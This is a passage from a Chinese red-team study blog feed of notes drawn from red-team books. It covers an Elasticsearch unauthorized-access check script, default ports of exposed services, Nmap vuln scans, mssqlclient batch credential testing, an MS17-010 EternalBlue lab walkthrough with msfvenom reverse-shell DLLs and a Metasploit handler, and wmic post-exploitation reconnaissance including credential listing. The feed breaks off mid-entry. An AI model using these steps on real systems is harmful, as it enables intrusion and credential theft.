<span class="token string">"text"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 成功往节点unauth_text插入数据'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    ret <span class="token operator">=</span> es<span class="token punctuation">.</span>get<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">"unauth_text"</span><span class="token punctuation">,</span> doc_type<span class="token operator">=</span><span class="token string">"test-type"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 成功获取节点unauth_text数据 : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">)</span>    es<span class="token punctuation">.</span>indices<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">'unauth_text'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 清除测试节点unauth_text数据'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] &#123;&#125; -> 存在ElasticSearch未授权漏洞'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'尝试获取节点信息：↓'</span><span class="token punctuation">)</span>    text <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://&#123;&#125;:&#123;&#125;/_nodes'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>    nodes_total <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token string">'_nodes'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'total'</span><span class="token punctuation">]</span>    nodes <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span><span class="token string">'nodes'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] &#123;&#125; -> [&#123;&#125;] : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> nodes_total<span class="token punctuation">,</span> nodes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    error <span class="token operator">=</span> e<span class="token punctuation">.</span>args    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] -> &#123;&#125;  error : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x06-Memcached"><a href="#0x06-Memcached" class="headerlink" title="0x06 Memcached"></a>0x06 Memcached</h2><p>默认端口：11211</p><p>提示连接成功表示存在漏洞</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">telnet <span class="token operator">&lt;</span>target<span class="token operator">></span> <span class="token number">11211</span> 或 <span class="token function">nc</span> -vv <span class="token operator">&lt;</span>target<span class="token operator">></span> <span class="token number">11211</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x07-Hadoop"><a href="#0x07-Hadoop" class="headerlink" title="0x07 Hadoop"></a>0x07 Hadoop</h2><h3 id="a-HDFS"><a href="#a-HDFS" class="headerlink" title="a) HDFS"></a>a) HDFS</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">NameNode默认端口 50070DataNode默认端口 50075httpfs默认端口 14000journalnode默认端口 8480<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="b-YARN（JobTracker）"><a href="#b-YARN（JobTracker）" class="headerlink" title="b) YARN（JobTracker）"></a>b) YARN（JobTracker）</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">ResourceManager默认端口 8088JobTracker默认端口 50030TaskTracker默认端口 50060<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="c-Hue"><a href="#c-Hue" class="headerlink" title="c) Hue"></a>c) Hue</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">Hue默认端口 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="d-YARN（JobTracker）"><a href="#d-YARN（JobTracker）" class="headerlink" title="d) YARN（JobTracker）"></a>d) YARN（JobTracker）</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">master默认端口 60010regionserver默认端口 60030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="e-hive-server2"><a href="#e-hive-server2" class="headerlink" title="e) hive-server2"></a>e) hive-server2</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">hive-server2默认端口 10000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="f-spark-jdbcserver"><a href="#f-spark-jdbcserver" class="headerlink" title="f) spark-jdbcserver"></a>f) spark-jdbcserver</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">spark-jdbcserver默认端口 10003<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x08-couchdb"><a href="#0x08-couchdb" class="headerlink" title="0x08 couchdb"></a>0x08 couchdb</h2><p>默认端口5984</p><p>couchdb的配置里将bind_address设置为0.0.0.0则存在未授权访问</p><h2 id="0x09-ldap"><a href="#0x09-ldap" class="headerlink" title="0x09 ldap"></a>0x09 ldap</h2><p>使用工具 ldap admin直接连接即可</p><h2 id="脚本合集"><a href="#脚本合集" class="headerlink" title="脚本合集"></a>脚本合集</h2><p><a href="https://github.com/f1veT/VulScan/find/master">https://github.com/f1veT/VulScan/find/master</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 外部打点 </tag>
            
            <tag> 未授权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见应用漏洞扫描&amp;利用</title>
      <link href="/2022/03/29/chang-jian-lou-dong-sao-miao/"/>
      <url>/2022/03/29/chang-jian-lou-dong-sao-miao/</url>
      
        <content type="html"><![CDATA[<p>本章节内容为Nmap扫描常见漏方式，mssqlclient和ms17-010脚本的使用方法。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="Nmap扫描技巧"><a href="#Nmap扫描技巧" class="headerlink" title="Nmap扫描技巧"></a>Nmap扫描技巧</h2><ul><li>auth 处理身份验证</li><li>broadcast 网络广播</li><li>brute 暴力破解</li><li>default 默认</li><li>discovery 服务发现</li><li>dos 拒绝服务</li><li>exploit 漏洞利用</li><li>external 外部扩展</li><li>fuzzer 模糊测试</li><li>intrusive 扫描可能造成不良后果</li><li>malware 检测后面</li><li>safe 扫描危害较小</li><li>version 版本识别</li><li>vuln 漏洞检测</li></ul><h3 id="通用参数-vuln"><a href="#通用参数-vuln" class="headerlink" title="通用参数 -vuln"></a>通用参数 -vuln</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap --script<span class="token operator">=</span>vuln <span class="token number">192.168</span>.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap --script<span class="token operator">=</span>smb-vuln-ms17-010 <span class="token number">192.168</span>.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/29/sf3yL6bT.png"></p><h2 id="impacket框架之mssql服务器安全检测"><a href="#impacket框架之mssql服务器安全检测" class="headerlink" title="impacket框架之mssql服务器安全检测"></a>impacket框架之mssql服务器安全检测</h2><p>在实际渗透测试工作中经常会遇到检测项目中mssql服务器安全性，此篇文章介绍impacket框架中mssqlclient的使用方法</p><p><a href="https://github.com/maaaaz/impacket-examples-windows">impacket for windows</a></p><h3 id="mssqlclient与其他工具相比的优势"><a href="#mssqlclient与其他工具相比的优势" class="headerlink" title="mssqlclient与其他工具相比的优势"></a>mssqlclient与其他工具相比的优势</h3><ol><li>跨平台，python脚本编写，并且已有exe版本</li><li>命令行执行，速度快</li><li>支持使用socks代理传输数据</li><li>支持以hash传递的方式进行账号验证</li><li>支持windows认证模式进行mssql服务的安全检测</li><li>支持sql命令可以是交互式，也可以直接回显sql命令执行结果</li></ol><h3 id="Mssqlclient的基本使用命令"><a href="#Mssqlclient的基本使用命令" class="headerlink" title="Mssqlclient的基本使用命令"></a>Mssqlclient的基本使用命令</h3><p>验证以windows认证模式的mssql服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python mssqlclient.py domain/username:password@ip -windows-auth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证以mssql账号密码认证的mssql服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python mssqlclient.py ./username:password@ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证以mssql账号密码认证的mssql服务，并执行command.txt内的sql命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python mssqlclient.py ./username:password@ip -file command.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="举例分析几种实际使用情况"><a href="#举例分析几种实际使用情况" class="headerlink" title="举例分析几种实际使用情况"></a>举例分析几种实际使用情况</h4><p>1.在linux环境下使用windows认证模式，mssqlclient测试登录sqlserver服务器，如下图，账号验证通过后直接返回sql shell</p><p><img src="https://imgtp.apqiang.com/2022/03/29/hajm7yu7.png"></p><p>2.使用ntlm hash验证方式，mssqlclient测试登录sqlserver服务器，账号验证成功后返回sql shell，如下图</p><p><img src="https://imgtp.apqiang.com/2022/03/30/QJC8uvVZ.png"></p><h3 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h3><p>除此之外，还可以批量检测内网SQL server服务器的账号安全性。</p><p>需准备的文件有：</p><ul><li>mssqlclient.exe（必须）</li><li>command.txt（必须）</li></ul><p>以下四个文件需选其一</p><ul><li>hashes.txt（需验证的ntlm hash字符串列表）</li><li>username.txt（需验证的username列表）</li><li>password.txt（需验证的密码字符串列表）</li><li>Ips.txt（需验证的ip字符串列表）</li></ul><h4 id="举例批量检测的bat脚本内容"><a href="#举例批量检测的bat脚本内容" class="headerlink" title="举例批量检测的bat脚本内容"></a>举例批量检测的bat脚本内容</h4><p>测试以windows认证模式，使用明文密码验证，使用mssqlclient批量测试登录sqlserver服务器，ips.txt内容为待检测sqlserver服务器ip，每行一条</p><pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">for &#x2F;f %%i in (ips.txt) do mssqlclient.exe .&#x2F;test:test@%%i -windows-auth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在cmd中可以把 %%i 替换为 %i 直接执行</p><p>可根据此模板更换批量检测的位置</p><p><img src="https://imgtp.apqiang.com/2022/03/30/RrQrbm7Y.png"></p><h2 id="MS17-010-py-脚本利用"><a href="#MS17-010-py-脚本利用" class="headerlink" title="MS17_010.py 脚本利用"></a>MS17_010.py 脚本利用</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>为什么要介绍py脚本？因为有些机器存在漏洞，但使用MSF的模块利用失败，而使用py脚本则能成功利用</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>必要工具 <a href="https://www.python.org/downloads/release/python-266/">python2.6.6</a>、<a href="https://github.com/mhammond/pywin32/releases/download/b221/pywin32-221.win32-py2.6.exe">pywin32-221.win32-py2.6.exe</a>、<a href="https://github.com/misterch0c/shadowbroker">shadowbroker</a>（必需要严格按照版本安装才能正常运行）</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">在本地用虚拟机搭建了Kali和Windows系统<span class="token number">192.168</span>.186.8windows7 IP脚本操作机<span class="token number">192.168</span>.186.5win2003 IP靶机<span class="token number">192.168</span>.186.26kali IP用于shell回连<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在kali中用msfvenom生成64位的dll</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.186.26 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f dll <span class="token operator">></span> x64.dllmsfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.186.26 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f dll <span class="token operator">></span> x32.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在msf中配置监听模块</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole进入控制台use exploit/multi/handler//使用监听模块<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp//设置payloadshow options//查看配置信息<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.186.26//设置本地IP<span class="token builtin class-name">set</span> LPORT <span class="token number">4444</span>//设置本地端口run//运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入到shadowbroker文件夹下的windows文件夹中打开fb.py，根据提示输入参数</p><p>使用Eternalblue模块攻击</p><p><img src="https://imgtp.apqiang.com/2022/03/30/AvXzNOAs.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/30/9UzdrKiP.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/30/2qT8D7DC.png"></p><p>使用Doublepulsar模块回连shell到kali</p><p><img src="https://imgtp.apqiang.com/2022/03/30/ruzDyvkM.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/30/bX85uHu6.png"></p><p>接下来一路回车，之后在kali上获得shell</p><p><img src="https://imgtp.apqiang.com/2022/03/30/bB4HlCyX.png"></p><p>NSA-ms17-010参考文章</p><p><a href="https://blog.csdn.net/weixin_38948797/article/details/79177880">https://blog.csdn.net/weixin_38948797/article/details/79177880</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 外部打点 </tag>
            
            <tag> tools </tag>
            
            <tag> 应用漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向常见端口</title>
      <link href="/2022/03/29/nei-wang-heng-xiang-chang-jian-duan-kou/"/>
      <url>/2022/03/29/nei-wang-heng-xiang-chang-jian-duan-kou/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍在内网中该一些常见的端口。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="Port：445"><a href="#Port：445" class="headerlink" title="Port：445"></a>Port：445</h2><p>SMB（Server Message Block）Windows协议族，主要功能为文件打印共享服务，简单来讲就是共享文件夹</p><p>该端口也是近年来内网横向扩展中比较火的端口，大名鼎鼎的永恒之蓝漏洞就是利用该端口，操作为扫描其是否存在MS17-010漏洞。正常情况下，其命令主要是建立IPC服务空会话</p><p><code>net use \\192.168.1.2</code></p><p>远程本地认证</p><p><code>net use \\192.168.1.2 /user:a\username password</code></p><p>注：a/username 中 a 为工作组情况下的机器命名，可以为任意字符，例如 workgroup/username</p><p>域 test.local 远程认证</p><p><code>net use \\192.168.1.2 /user:test\username password</code></p><h2 id="Port：137、138、139"><a href="#Port：137、138、139" class="headerlink" title="Port：137、138、139"></a>Port：137、138、139</h2><p>NetBios端口，137、138为UDP端口，主要用于内网传输文件，而NetBios/SMB服务器的获取主要是通过139端口的</p><h2 id="Port：135"><a href="#Port：135" class="headerlink" title="Port：135"></a>Port：135</h2><p>该端口主要使用DCOM和RPC（Remote Procedure Call）服务，我们利用这个端口主要做WMI（Windos Management Instrumentation）管理工具的远程操作</p><ul><li>使用时需要开启wmic服务</li><li>几乎所有的命令都是管理员权限</li><li>如果出现”Invalid Global Switch”，需要使用双引号把该加的地方都加上</li><li>远程系统的本地安全策略的”网络访问：本地账户的共享和安全模式”应设为”经典-本地用户以自己的身份验证”</li><li>防火墙最好是关闭状态</li></ul><p>同时，wmic还有很多版本 类似于 python版本、Powershell版本和exe版本等等</p><p>该端口还可以验证是否开启Exchange Server</p><h2 id="Port：53"><a href="#Port：53" class="headerlink" title="Port：53"></a>Port：53</h2><p>该端口为DNS服务端口，只要提供域名解析服务使用，该端口在渗透过程中可以寻找一下DNS域传送漏洞，在内网中可以使用DNS协议进行通信传输，隐蔽性更加好，参考文章：</p><ul><li>dns隧道之dns2tcp</li><li>dns隧道之dnscat2</li></ul><h2 id="Port：389"><a href="#Port：389" class="headerlink" title="Port：389"></a>Port：389</h2><p>用于LADP（轻量级目录访问协议），属于TCP/IP协议，在域过程中一般出现在域控上出现该端口，进行权限认证服务，如果拥有对该域的用户，且担心net或者其他爆破方法不可行的情况，可以尝试使用LADP端口进行爆破</p><p>工具可以使用类似于hydra等开源项目</p><h2 id="Port：88"><a href="#Port：88" class="headerlink" title="Port：88"></a>Port：88</h2><p>该端口主要开启kerberos服务，属于TCP/IP协议，主要任务是监听KDC的票据请求，该协议在渗透过程中可以进行黄金票据和白银票据的伪造，以横向扩展某些服务</p><h2 id="Port：5985"><a href="#Port：5985" class="headerlink" title="Port：5985"></a>Port：5985</h2><p>该端口主要介绍WinRM服务，WinRM是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windows服务进行管理并获取数据。并且WinRM服务自Windows Vista开始成为Windows的默认组件</p><p>条件：</p><ul><li>Windows Vista上必须手动启动，而Windows Server 2008中服务是默认开启的</li><li>服务在后台开启，但端口还没有开启监听，所以需要开启端口</li><li>使用 winrm quickconfig 对WinRM进行配置，开启HTTP和HTTPS监听，且需要开启防火墙</li></ul>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网信息搜集之wmic命令的一些使用方法</title>
      <link href="/2022/03/28/nei-wang-xin-xi-sou-ji-zhi-wmic-ming-ling-de-yi-xie-shi-yong-fang-fa/"/>
      <url>/2022/03/28/nei-wang-xin-xi-sou-ji-zhi-wmic-ming-ling-de-yi-xie-shi-yong-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍在内网中wmic命令。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h2><p>wmic和cmd一样在所有的windows版本中都存在，同时wmic有很多cmd下不方便使用的部分，今天给大家介绍一些在后渗透过程中非常适用的使用wmic进行信息收集的命令</p><h2 id="0x01-关于wmic"><a href="#0x01-关于wmic" class="headerlink" title="0x01.关于wmic"></a>0x01.关于wmic</h2><p>WMI命令行（WMIC）实用程序为WMI提供了命令行界面。WMIC与现有的Shell和实用程序命令兼容。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门的WMI应用，例如SMS，或者使用WMI的脚本编程API，或者使用像CIM Studio之类的工具。如果不熟悉C++之类的编程语言或VBSCript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管理系统是很困难的。WMIC改变了这种情况</p><h2 id="0x02-wmic的简单使用"><a href="#0x02-wmic的简单使用" class="headerlink" title="0x02.wmic的简单使用"></a>0x02.wmic的简单使用</h2><p>首先在cmd命令行输入wmic进入交互式页面，这里说一下在powershell也可以和cmd命令行一样的操作</p><p><code>wmic /？</code> 查看WMIC命令的全局选项，WMIC全局选项可以用来设置WMIC环境的各种属性</p><p><img src="https://imgtp.apqiang.com/2022/03/28/Pfa0qYVK.png"></p><p><code>wmic process /?</code> 进程管理的帮助</p><p><img src="https://imgtp.apqiang.com/2022/03/28/uCo7Z5x3.png"></p><p><code>wmic process get /?</code> 属性获取操作帮助</p><p><img src="https://imgtp.apqiang.com/2022/03/28/nQO8OTsj.png"></p><h2 id="0x03-以进程为例展现wmic的使用"><a href="#0x03-以进程为例展现wmic的使用" class="headerlink" title="0x03.以进程为例展现wmic的使用"></a>0x03.以进程为例展现wmic的使用</h2><p>这里的靶机使用的是一台win7 x86的虚拟机 这里以查看进程为例：</p><p><code>wmic process get caption,executablepath,processid</code> 获取系统当前正在运行的进程、进程运行的路径、进程id</p><p><img src="https://imgtp.apqiang.com/2022/03/28/rNIxLrly.png"></p><p><code>wmic service where (state=&quot;running&quot;) get name,processid,pathname,startmode,caption</code> 获取系统运行的应用进程，进程名称，进程应用路径、进程id</p><p><img src="https://imgtp.apqiang.com/2022/03/28/dUB7fPTT.png"></p><p><code>wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe,productState</code> 查询杀毒软件</p><p><img src="https://imgtp.apqiang.com/2022/03/29/U69zvrpq.png"></p><p><code>wmic onboarddevice get Description,DeviceType,Enabled,Status /format:list</code> 获取主板内置信息</p><p><img src="https://imgtp.apqiang.com/2022/03/29/JVqNqWon.png"></p><p><code>wmic product get name</code> 系统安装软件情况</p><p><img src="https://imgtp.apqiang.com/2022/03/29/9O3uj4Xz.png"></p><p><code>wmic environment get Description,VariableValue</code> 系统环境变量</p><p><img src="https://imgtp.apqiang.com/2022/03/29/m5GnGk0V.png"></p><p><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:list</code>  获取域名，主板信息，主机名，角色，用户名</p><p><img src="https://imgtp.apqiang.com/2022/03/29/Bgy0UFlt.png"></p><p><code>wmic sysdriver get caption,Name,PathName,ServiceType,State,Status /format:list</code> 获取所有进程的进程名、运行路径、服务类型、状态</p><p><img src="https://imgtp.apqiang.com/2022/03/29/ZYVGLPnS.png"></p><p>关于跟多的信息可以通过官方的说明文档</p><p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic</a></p><h2 id="0x04-关于powershell的Get-Wmi对象"><a href="#0x04-关于powershell的Get-Wmi对象" class="headerlink" title="0x04.关于powershell的Get-Wmi对象"></a>0x04.关于powershell的Get-Wmi对象</h2><p>Get-Wmi是获取Windows Management Instrumentation（WMI）类的实例或有关可用类的信息。</p><p>我们需要首先知道自己的windows计算机支持哪些可用的WMI类</p><p><code>Get-Wmiobject -list</code> 自己的windows计算机支持哪些可用的WMI类</p><p><img src="https://imgtp.apqiang.com/2022/03/29/atPqrfIz.png"></p><p>例子：在本地计算机上获取进程</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">></span> get-wmiobject位于命令管道位置 <span class="token number">1</span> 的 cmdlet Get-WmiObject请为以下参数提供值:Class: win32_process<span class="token comment">#在本地计算机上获取进程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/29/vknWQNNL.png"></p><p>Get-WmiObject和wmic相比，可以说是一个升级版，Get-WmiObject可以指定一个参数进行使用（Parameters）例如在本地计算机上获取进程，也可以指定相应的参数进行一个查询他的一个过程</p><p><code>Get-WmiObject -Class Win32_Process</code> 在本地计算机上获取进程</p><p>具体的参数以及命令在官方文档中进行查询</p><p><a href="http://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.1#parameters">http://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.1#parameters</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网信息收集</title>
      <link href="/2022/03/28/nei-wang-xin-xi-shou-ji/"/>
      <url>/2022/03/28/nei-wang-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<p>本章节内容主要是介绍在内网中该如何搜集信息以及该搜集哪些信息。</p><p>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="0x01-Windows（工作组和域）"><a href="#0x01-Windows（工作组和域）" class="headerlink" title="0x01 Windows（工作组和域）"></a>0x01 Windows（工作组和域）</h2><h3 id="0x01-1-检查当前shell权限"><a href="#0x01-1-检查当前shell权限" class="headerlink" title="0x01-1 检查当前shell权限"></a>0x01-1 检查当前shell权限</h3><p><code>whoami /user &amp;&amp; whoami /priv</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/4G3iqZCD.png"></p><h3 id="0x01-2-查看系统信息"><a href="#0x01-2-查看系统信息" class="headerlink" title="0x01-2 查看系统信息"></a>0x01-2 查看系统信息</h3><p><code>systeminfo</code></p><p>主机名-&gt;扮演的角色</p><p><img src="https://imgtp.apqiang.com/2022/03/28/g9zanT0N.png"></p><h3 id="0x01-3-tcp-udp-网络连接状态信息"><a href="#0x01-3-tcp-udp-网络连接状态信息" class="headerlink" title="0x01-3 tcp/udp 网络连接状态信息"></a>0x01-3 tcp/udp 网络连接状态信息</h3><p><code>netstat -ano</code></p><p>可以获取内网IP分布状态-服务（redis）</p><p><img src="https://imgtp.apqiang.com/2022/03/28/cAb597HL.png"></p><h3 id="0x01-4-机器名"><a href="#0x01-4-机器名" class="headerlink" title="0x01-4 机器名"></a>0x01-4 机器名</h3><p><code>hostname</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/NvjsJrOS.png"></p><h3 id="0x01-5-查看当前操作系统"><a href="#0x01-5-查看当前操作系统" class="headerlink" title="0x01-5 查看当前操作系统"></a>0x01-5 查看当前操作系统</h3><p><code>wmic OS get Caption,CSDVersion,OSArchitecture,Version</code></p><p><code>ver</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/ARv8kjn7.png"></p><h3 id="0x01-6-查杀软"><a href="#0x01-6-查杀软" class="headerlink" title="0x01-6 查杀软"></a>0x01-6 查杀软</h3><p><code>WMIC /Node:localhost /Namespace:\\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:list</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/5tkLRNnG.png"></p><h3 id="0x01-7-查看当前安装的程序"><a href="#0x01-7-查看当前安装的程序" class="headerlink" title="0x01-7 查看当前安装的程序"></a>0x01-7 查看当前安装的程序</h3><p><code>wmic product get name,verion</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/QmVn4TwI.png"></p><h3 id="0x01-8-查看在线用户"><a href="#0x01-8-查看在线用户" class="headerlink" title="0x01-8 查看在线用户"></a>0x01-8 查看在线用户</h3><p><code>quesr</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/JVCXP6MS.png"></p><h3 id="0x01-9-查看网络配置"><a href="#0x01-9-查看网络配置" class="headerlink" title="0x01-9 查看网络配置"></a>0x01-9 查看网络配置</h3><p>有Primary Dns Suffix就说明是域内，空的则当前机器应该在工作组</p><p><code>ipconfig /all</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/7z3QNQAe.png"></p><h3 id="0x01-10-查看进程"><a href="#0x01-10-查看进程" class="headerlink" title="0x01-10 查看进程"></a>0x01-10 查看进程</h3><p><code>tasklist /v</code></p><p>有些进程可能是域用户开启的-&gt;通过管理员权限 凭证窃取-&gt;窃取域用户的凭证</p><p><img src="https://imgtp.apqiang.com/2022/03/28/1e0FrROM.png"></p><h3 id="0x01-11查看当前登录域"><a href="#0x01-11查看当前登录域" class="headerlink" title="0x01-11查看当前登录域"></a>0x01-11查看当前登录域</h3><p><code>net config workstation</code></p><p><img src="https://imgtp.apqiang.com/2022/03/28/OquVB2qn.png"></p><h3 id="0x01-12-远程桌面连接历史记录"><a href="#0x01-12-远程桌面连接历史记录" class="headerlink" title="0x01-12 远程桌面连接历史记录"></a>0x01-12 远程桌面连接历史记录</h3><p><code>cmdkey /l</code></p><p>把凭证取下来-&gt;本地解密</p><p><img src="https://imgtp.apqiang.com/2022/03/28/3hf2Ldzj.png"></p><h3 id="0x01-13-查看本机上的用户账号列表"><a 